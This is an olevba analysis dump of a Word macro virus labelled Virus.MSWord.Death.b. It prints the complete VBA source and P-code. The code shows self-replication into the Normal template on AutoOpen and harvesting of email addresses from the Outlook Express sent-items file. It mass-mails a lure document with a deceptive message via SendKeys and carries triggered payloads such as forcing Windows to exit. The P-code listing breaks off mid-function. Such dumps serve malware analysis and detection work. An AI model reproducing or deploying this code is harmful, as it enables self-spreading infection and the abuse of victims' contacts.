olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Death.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Death.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AddString.bas 
in file: ./Virus.MSWord.Death.b - OLE stream: 'Macros/VBA/AddString'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados
Public pq As String



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Web.AddString.AutoOpen"
 Call AddFile
 Call AddNew
 Call MailNew
 Call Verday
End Sub
 
Sub AddNew()
Attribute AddNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AddNew.VB_ProcData.VB_Invoke_Func = "Web.AddString.AddNew"
Dim exec
exec = Counter()

On Error GoTo 0
Open pq + "\Death Kiss.Ini" For Output As #1
Print #1, exec + 1
Close #1

Doc = ActiveDocument.Path + "\" + ActiveDocument.Name
dot = NormalTemplate.FullName

On Error Resume Next

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0
On Error Resume Next

Application.OrganizerCopy Source:=dot, _
       Destination:=Doc, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=dot, _
       Destination:=ActiveDocument.Name, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0

End Sub

Function Counter()
Dim exec
exec = ""
On Error Resume Next
Open pq + "\Death Kiss.Ini" For Input As #1
Input #1, exec
Close #1
On Error GoTo 0
Counter = Val(exec)
End Function

Function AddFile()
Dim meucar As String
cdir = CurDir()

On Error Resume Next
  ChDir "\"
  MkDir "\Windows"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows"
MkDir "Application Users"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows\Application Users"
MkDir "AddFile"
On Error GoTo 0

ChDir cdir
pq = "\Windows\Application Users\AddFile"
On Error GoTo 0

p = ActiveDocument.Path + "\Pesquisa de Opinião.doc"

If Counter() = 0 Then
   On Error Resume Next
   Open p For Binary As #1
   Do While Meulocal < LOF(1)
       meucar = meucar & Input(2048, #1)
       Meulocal = Loc(1)
   Loop
   Close #1

   Open pq + "\Pesquisa de Opinião.doc" For Binary Access Write As #1
   Put #1, , meucar
   Close #1
   On Error GoTo 0
End If
End Function

-------------------------------------------------------------------------------
VBA MACRO AddMail.bas 
in file: ./Virus.MSWord.Death.b - OLE stream: 'Macros/VBA/AddMail'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados

Sub MailNew()
Attribute MailNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute MailNew.VB_ProcData.VB_Invoke_Func = "Web.AddMail.MailNew"
Dim meucar, Meulocal
Dim s As String
Dim F As Long
Dim correio, vetor(100)

If Not Ismail() Then
  Exit Sub
  Else
   If Endmail() = "Yes" Then
     Exit Sub
   End If
End If

On Error Resume Next
Open "c:\windows\application data\microsoft\outlook express\mail\Itens enviados.mbx" For Binary As #1
Do While Meulocal < LOF(1)
    meucar = meucar & Input(2048, #1)
    Meulocal = Loc(1)
Loop
Close #1
On Error GoTo 0

v = 0
c = 1
flag = True

While flag
c = InStr(c, meucar, "<")

If c > 0 Then
F = InStr(c, meucar, ">")
s = Mid(meucar, c + 1, F - c - 1)
Else
flag = False
End If

If InStr(1, s, "@") > 0 Then
vetor(v) = s
v = v + 1
If v = 100 Then
   flag = False
End If

End If
c = c + 1
Wend

For Each minhatarefa In Tasks
  If v > 0 Then
    F = InStr(1, minhatarefa.Name, "-")
    If F > 0 Then
       c = Mid(minhatarefa.Name, F + 1)
      Else
       c = minhatarefa.Name
    End If
    
    If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
        On Error Resume Next
        minhatarefa.Activate
        minhatarefa.WindowState = wdWindowStateMaximize
        SendKeys "%(R)", True
        SendKeys "N", True
        Exit For
        On Error GoTo 0
    End If
End If
Next minhatarefa

For Each minhatarefa In Tasks
    If InStr(minhatarefa.Name, "Nova mensagem") > 0 Then
        minhatarefa.Activate
        minhatarefa.WindowState = wdWindowStateNormal
        ucar = ""
        Stopmail
       For i = 1 To 100
        If vetor(i) <> "" Then
           ucar = ucar + vetor(i) + ";"
        End If
       Next
       ucar = ucar + "{TAB}" + "{TAB}" + "{TAB}" + "Mensagem Importante" + "{TAB}"
       ucar = ucar + "Estou lhe enviando aquele documento que vc me pediu." + "%(I)x"
       ucar = ucar + pq + "\Pesquisa de Opinião.doc" + "{ENTER}" + "%(A)T" + "{ENTER}"
       SendKeys ucar, True
    End If
Next minhatarefa

For Each minhatarefa In Tasks
    p = InStr(1, minhatarefa.Name, "-")
    c = ""
     If p > 0 Then
         c = Left(minhatarefa.Name, p - 1)
     End If
    If InStr(c, "Microsoft Word") > 0 Then
      minhatarefa.Activate
      Exit For
    End If
Next
End Sub
Function Verday()
Dim con
con = Counter()

If con >= 1000 And con <= 15000 Then
    Tasks.ExitWindows
  Else
   If con >= 80 And con <= 200 Then
     Windows.Arrange
     Windows.Application.ChangeFileOpenDirectory ("c:\windows\Temporary Internet Files")
   End If
   If con > 200 And con <= 220 Then
     Documents.Add.PrintOut
   End If
   
   If con > 500 And con <= 600 Then
    If Tasks.Exists("Calculadora") Then
          With Tasks("Calculadora")
               .Activate
               .WindowState = wdWindowStateNormal
          End With
          SendKeys Str(con), True
      Else
        Shell "calc.exe"
        Tasks("Calculadora").WindowState = wdWindowStateNormal
        SendKeys Str(con), True
     End If
   End If

End If
dia = WeekDay(Date)
hora = Mid(Time(), 1, 2)
rd = LTrim(Str(Int((24 * Rnd) + 1)))

Texto = "((((((((((((((((((((((((( D e a t h   K i s s  )))))))))))))))))))))))))" + Chr(13)
If dia = 6 And hora = rd Then
   Selection.EndKey Unit:=wdStory, Extend:=wdMove
   Set Doc = ActiveDocument
   Set meuIntervalo = Doc.Range(Start:=Doc.Paragraphs(1).Range.End - 1, _
       End:=Doc.Paragraphs(1).Range.End - 1)
       meuIntervalo.InsertAfter Texto
End If
End Function

Function Ismail() As Boolean
For Each minhatarefa In Tasks
flg = False
    F = InStr(1, minhatarefa.Name, "-")
    If F > 0 Then
       c = Mid(minhatarefa.Name, F + 1)
      Else
       c = minhatarefa.Name
    End If
    If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
       flg = True
       Exit For
    End If
Next minhatarefa
Ismail = flg
End Function

Function Stopmail() As String
 On Error Resume Next
 Open pq + "\Death End.Ini" For Output As #1
 Print #1, "Yes"
 Close #1
On Error GoTo 0
End Function

Function Endmail()

Dim ret
ret = "No"
 On Error Resume Next
 Open pq + "\Death End.Ini" For Input As #1
 Input #1, ret
 Close #1
 On Error GoTo 0
Endmail = ret
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Death.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AddString - 4767 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0028 "The Microsoft Word Language Visual Basic"
' Line #1:
' 	QuoteRem 0x0000 0x001C "Copyright (c) 1999 Microsoft"
' Line #2:
' 	QuoteRem 0x0000 0x001C "Todos os direitos reservados"
' Line #3:
' 	Dim (Public) 
' 	VarDefn pq (As String)
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	ArgsCall (Call) AddFile 0x0000 
' Line #9:
' 	ArgsCall (Call) AddNew 0x0000 
' Line #10:
' 	ArgsCall (Call) MailNew 0x0000 
' Line #11:
' 	ArgsCall (Call) Verday 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Sub AddNew())
' Line #15:
' 	Dim 
' 	VarDefn exec
' Line #16:
' 	ArgsLd Counter 0x0000 
' 	St exec 
' Line #17:
' Line #18:
' 	OnError (GoTo 0) 
' Line #19:
' 	Ld pq 
' 	LitStr 0x000F "\Death Kiss.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld exec 
' 	LitDI2 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St Doc 
' Line #24:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St dot 
' Line #25:
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' Line #28:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld Doc 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AddString"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' Line #30:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld Doc 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AddMail"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' Line #32:
' 	OnError (GoTo 0) 
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' Line #35:
' 	LineCont 0x0008 07 00 07 00 0F 00 07 00
' 	Ld dot 
' 	ParamNamed Source 
' 	Ld Doc 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AddString"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' Line #37:
' 	LineCont 0x0008 07 00 07 00 11 00 07 00
' 	Ld dot 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AddMail"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' Line #39:
' 	OnError (GoTo 0) 
' Line #40:
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Function Counter())
' Line #44:
' 	Dim 
' 	VarDefn exec
' Line #45:
' 	LitStr 0x0000 ""
' 	St exec 
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Ld pq 
' 	LitStr 0x000F "\Death Kiss.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld exec 
' 	InputItem 
' 	InputDone 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' 	OnError (GoTo 0) 
' Line #51:
' 	Ld exec 
' 	ArgsLd Val 0x0001 
' 	St Counter 
' Line #52:
' 	EndFunc 
' Line #53:
' Line #54:
' 	FuncDefn (Function AddFile())
' Line #55:
' 	Dim 
' 	VarDefn meucar (As String)
' Line #56:
' 	ArgsLd CurDir 0x0000 
' 	St cdir 
' Line #57:
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	LitStr 0x0001 "\"
' 	ArgsCall ChDir 0x0001 
' Line #60:
' 	LitStr 0x0008 "\Windows"
' 	ArgsCall MkDir 0x0001 
' Line #61:
' 	OnError (GoTo 0) 
' Line #62:
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	LitStr 0x0008 "\Windows"
' 	ArgsCall ChDir 0x0001 
' Line #65:
' 	LitStr 0x0011 "Application Users"
' 	ArgsCall MkDir 0x0001 
' Line #66:
' 	OnError (GoTo 0) 
' Line #67:
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LitStr 0x001A "\Windows\Application Users"
' 	ArgsCall ChDir 0x0001 
' Line #70:
' 	LitStr 0x0007 "AddFile"
' 	ArgsCall MkDir 0x0001 
' Line #71:
' 	OnError (GoTo 0) 
' Line #72:
' Line #73:
' 	Ld cdir 
' 	ArgsCall ChDir 0x0001 
' Line #74:
' 	LitStr 0x0022 "\Windows\Application Users\AddFile"
' 	St pq 
' Line #75:
' 	OnError (GoTo 0) 
' Line #76:
' Line #77:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0018 "\Pesquisa de Opinião.doc"
' 	Add 
' 	St p 
' Line #78:
' Line #79:
' 	ArgsLd Counter 0x0000 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #82:
' 	Ld Meulocal 
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	Lt 
' 	DoWhile 
' Line #83:
' 	Ld meucar 
' 	LitDI2 0x0800 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	Concat 
' 	St meucar 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd Loc 0x0001 
' 	St Meulocal 
' Line #85:
' 	Loop 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #87:
' Line #88:
' 	Ld pq 
' 	LitStr 0x0018 "\Pesquisa de Opinião.doc"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write)
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld meucar 
' 	PutRec 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	OnError (GoTo 0) 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndFunc 
' Line #94:
' Macros/VBA/AddMail - 8802 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0028 "The Microsoft Word Language Visual Basic"
' Line #2:
' 	QuoteRem 0x0000 0x001C "Copyright (c) 1999 Microsoft"
' Line #3:
' 	QuoteRem 0x0000 0x001C "Todos os direitos reservados"
' Line #4:
' Line #5:
' 	FuncDefn (Sub MailNew())
' Line #6:
' 	Dim 
' 	VarDefn meucar
' 	VarDefn Meulocal
' Line #7:
' 	Dim 
' 	VarDefn s (As String)
' Line #8:
' 	Dim 
' 	VarDefn False (As Long)
' Line #9:
' 	Dim 
' 	VarDefn correio
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn vetor
' Line #10:
' Line #11:
' 	ArgsLd Ismail 0x0000 
' 	Not 
' 	IfBlock 
' Line #12:
' 	ExitSub 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	ArgsLd Endmail 0x0000 
' 	LitStr 0x0003 "Yes"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	ExitSub 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	EndIfBlock 
' Line #18:
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitStr 0x004D "c:\windows\application data\microsoft\outlook express\mail\Itens enviados.mbx"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #21:
' 	Ld Meulocal 
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	Lt 
' 	DoWhile 
' Line #22:
' 	Ld meucar 
' 	LitDI2 0x0800 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	Concat 
' 	St meucar 
' Line #23:
' 	LitDI2 0x0001 
' 	ArgsLd Loc 0x0001 
' 	St Meulocal 
' Line #24:
' 	Loop 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #26:
' 	OnError (GoTo 0) 
' Line #27:
' Line #28:
' 	LitDI2 0x0000 
' 	St v 
' Line #29:
' 	LitDI2 0x0001 
' 	St c 
' Line #30:
' 	LitVarSpecial (True)
' 	St flag 
' Line #31:
' Line #32:
' 	Ld flag 
' 	While 
' Line #33:
' 	Ld c 
' 	Ld meucar 
' 	LitStr 0x0001 "<"
' 	FnInStr3 
' 	St c 
' Line #34:
' Line #35:
' 	Ld c 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #36:
' 	Ld c 
' 	Ld meucar 
' 	LitStr 0x0001 ">"
' 	FnInStr3 
' 	St False 
' Line #37:
' 	Ld meucar 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld False 
' 	Ld c 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St s 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	LitVarSpecial (False)
' 	St flag 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	LitDI2 0x0001 
' 	Ld s 
' 	LitStr 0x0001 "@"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #43:
' 	Ld s 
' 	Ld v 
' 	ArgsSt vetor 0x0001 
' Line #44:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Add 
' 	St v 
' Line #45:
' 	Ld v 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	LitVarSpecial (False)
' 	St flag 
' Line #47:
' 	EndIfBlock 
' Line #48:
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #51:
' 	Wend 
' Line #52:
' Line #53:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #54:
' 	Ld v 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	FnInStr3 
' 	St False 
' Line #56:
' 	Ld False 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #57:
' 	Ld minhatarefa 
' 	MemLd New 
' 	Ld False 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St c 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	Ld minhatarefa 
' 	MemLd New 
' 	St c 
' Line #60:
' 	EndIfBlock 
' Line #61:
' Line #62:
' 	LitDI2 0x0001 
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x000F "Outlook Express"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #63:
' 	OnError (Resume Next) 
' Line #64:
' 	Ld minhatarefa 
' 	ArgsMemCall Activate 0x0000 
' Line #65:
' 	Ld wdWindowStateMaximize 
' 	Ld minhatarefa 
' 	MemSt WindowState 
' Line #66:
' 	LitStr 0x0004 "%(R)"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #67:
' 	LitStr 0x0001 "N"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #68:
' 	ExitFor 
' Line #69:
' 	OnError (GoTo 0) 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' Line #74:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #75:
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x000D "Nova mensagem"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #76:
' 	Ld minhatarefa 
' 	ArgsMemCall Activate 0x0000 
' Line #77:
' 	Ld wdWindowStateNormal 
' 	Ld minhatarefa 
' 	MemSt WindowState 
' Line #78:
' 	LitStr 0x0000 ""
' 	St ucar 
' Line #79:
' 	ArgsCall Stopmail 0x0000 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #81:
' 	Ld i 
' 	ArgsLd vetor 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #82:
' 	Ld ucar 
' 	Ld i 
' 	ArgsLd vetor 0x0001 
' 	Add 
' 	LitStr 0x0001 ";"
' 	Add 
' 	St ucar 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	Ld ucar 
' 	LitStr 0x0005 "{TAB}"
' 	Add 
' 	LitStr 0x0005 "{TAB}"
' 	Add 
' 	LitStr 0x0005 "{TAB}"
' 	Add 
' 	LitStr 0x0013 "Mensagem Importante"
' 	Add 
' 	LitStr 0x0005 "{TAB}"
' 	Add 
' 	St ucar 
' Line #86:
' 	Ld ucar 
' 	LitStr 0x0034 "Estou lhe enviando aquele documento que vc me pediu."
' 	Add 
' 	LitStr 0x0005 "%(I)x"
' 	Add 
' 	St ucar 
' Line #87:
' 	Ld ucar 
' 	Ld pq 
' 	Add 
' 	LitStr 0x0018 "\Pesquisa de Opinião.doc"
' 	Add 
' 	LitStr 0x0007 "{ENTER}"
' 	Add 
' 	LitStr 0x0005 "%(A)T"
' 	Add 
' 	LitStr 0x0007 "{ENTER}"
' 	Add 
' 	St ucar 
' Line #88:
' 	Ld ucar 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' Line #92:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	FnInStr3 
' 	St p 
' Line #94:
' 	LitStr 0x0000 ""
' 	St c 
' Line #95:
' 	Ld p 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #96:
' 	Ld minhatarefa 
' 	MemLd New 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St c 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	Ld c 
' 	LitStr 0x000E "Microsoft Word"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #99:
' 	Ld minhatarefa 
' 	ArgsMemCall Activate 0x0000 
' Line #100:
' 	ExitFor 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Function Verday())
' Line #105:
' 	Dim 
' 	VarDefn con
' Line #106:
' 	ArgsLd Counter 0x0000 
' 	St con 
' Line #107:
' Line #108:
' 	Ld con 
' 	LitDI2 0x03E8 
' 	Ge 
' 	Ld con 
' 	LitDI2 0x3A98 
' 	Le 
' 	And 
' 	IfBlock 
' Line #109:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #110:
' 	ElseBlock 
' Line #111:
' 	Ld con 
' 	LitDI2 0x0050 
' 	Ge 
' 	Ld con 
' 	LitDI2 0x00C8 
' 	Le 
' 	And 
' 	IfBlock 
' Line #112:
' 	Ld Windows 
' 	ArgsMemCall Arrange 0x0000 
' Line #113:
' 	LitStr 0x0023 "c:\windows\Temporary Internet Files"
' 	Paren 
' 	Ld Windows 
' 	MemLd Application 
' 	ArgsMemCall ChangeFileOpenDirectory 0x0001 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld con 
' 	LitDI2 0x00C8 
' 	Gt 
' 	Ld con 
' 	LitDI2 0x00DC 
' 	Le 
' 	And 
' 	IfBlock 
' Line #116:
' 	Ld Documents 
' 	MemLd Add 
' 	ArgsMemCall PrintOut 0x0000 
' Line #117:
' 	EndIfBlock 
' Line #118:
' Line #119:
' 	Ld con 
' 	LitDI2 0x01F4 
' 	Gt 
' 	Ld con 
' 	LitDI2 0x0258 
' 	Le 
' 	And 
' 	IfBlock 
' Line #120:
' 	LitStr 0x000B "Calculadora"
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	IfBlock 
' Line #121:
' 	StartWithExpr 
' 	LitStr 0x000B "Calculadora"
' 	ArgsLd Tasks 0x0001 
' 	With 
' Line #122:
' 	ArgsMemCallWith Activate 0x0000 
' Line #123:
' 	Ld wdWindowStateNormal 
' 	MemStWith WindowState 
' Line #124:
' 	EndWith 
' Line #125:
' 	Ld con 
' 	ArgsLd Str 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #126:
' 	ElseBlock 
' Line #127:
' 	LitStr 0x0008 "calc.exe"
' 	ArgsCall Shell 0x0001 
' Line #128:
' 	Ld wdWindowStateNormal 
' 	LitStr 0x000B "Calculadora"
' 	ArgsLd Tasks 0x0001 
' 	MemSt WindowState 
' Line #129:
' 	Ld con 
' 	ArgsLd Str 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndIfBlock 
' Line #132:
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	St dia 
' Line #135:
' 	ArgsLd Time 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St hora 
' Line #136:
' 	LitDI2 0x0018 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	ArgsLd LTrim 0x0001 
' 	St rd 
' Line #137:
' Line #138:
' 	LitStr 0x0048 "((((((((((((((((((((((((( D e a t h   K i s s  )))))))))))))))))))))))))"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Texto 
' Line #139:
' 	Ld dia 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld hora 
' 	Ld rd 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #140:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld wdMove 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0002 
' Line #141:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' Line #142:
' 	LineCont 0x0004 16 00 07 00
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	ParamNamed Start 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	ArgsMemLd Paragraphs 0x0001 
' 	MemLd Range 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	ParamNamed End 
' 	Ld Doc 
' 	ArgsMemLd Range 0x0002 
' 	Set meuIntervalo 
' Line #143:
' 	Ld Texto 
' 	Ld meuIntervalo 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	EndFunc 
' Line #146:
' Line #147:
' 	FuncDefn (Function Ismail() As Boolean)
' Line #148:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #149:
' 	LitVarSpecial (False)
' 	St flg 
' Line #150:
' 	LitDI2 0x0001 
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x0001 "-"
' 	FnInStr3 
' 	St False 
' Line #151:
' 	Ld False 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #152:
' 	Ld minhatarefa 
' 	MemLd New 
' 	Ld False 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St c 
' Line #153:
' 	ElseBlock 
' Line #154:
' 	Ld minhatarefa 
' 	MemLd New 
' 	St c 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	LitDI2 0x0001 
' 	Ld minhatarefa 
' 	MemLd New 
' 	LitStr 0x000F "Outlook Express"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #157:
' 	LitVarSpecial (True)
' 	St flg 
' Line #158:
' 	ExitFor 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	StartForVariable 
' 	Ld minhatarefa 
' 	EndForVariable 
